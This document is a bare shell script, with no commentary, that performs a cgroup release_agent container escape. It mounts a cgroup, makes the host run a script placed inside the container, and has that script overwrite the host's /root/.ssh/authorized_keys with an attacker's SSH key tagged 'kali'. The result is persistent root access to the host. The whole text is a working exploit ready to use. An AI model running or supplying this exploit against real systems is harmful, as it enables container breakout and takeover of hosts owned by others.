mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCv2EBmO8TeZYxlmirZry4Jvz+wXZAkrUIHk3DrUxC988BcbxJzePU/Mtgn06BWPALtNUdfphe+aktHdeNLs/Zvkc0tVqvxpTT9qVoeLv8ZkHEMzZFJVBwhmNWUazYwsZ20Grwvsu08tFOgebWaxbNJN4bNXGJtSV4L0lelnEWwm0F85fQqLIxl7SnB9qgFVSo2PuxJ5yMeFH2B4Uo5RX9Uaj8OVbT57MCF4na7JNEwEsH3M7fGMrwDd0CNGThoxUTEDTRqiX06Y3qRwEHAUYpZR4fEJFdar7DkmK7zsqLx3aej2JoZ1tYjAnBneUzqKwcHsNAik03scB6zhtJQOJZQvxzGdyP2S6DxdSjIyt4J2/MrXad+T1j1FH0IqG93QZusTe+RdS/B6LwyYti/GnfLAEQC2HiRxD/mUe6U7K+SU+jbwDyRvFBJXCgx/NpBztNR5aoJVwbsbOS6U5eLO+7chKAHw4l5iiWP8WQn7zDtAzCRN/vt2V9bxQE32jUuZDU= 1nj3ct10n@kali' > /root/.ssh/authorized_keys" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
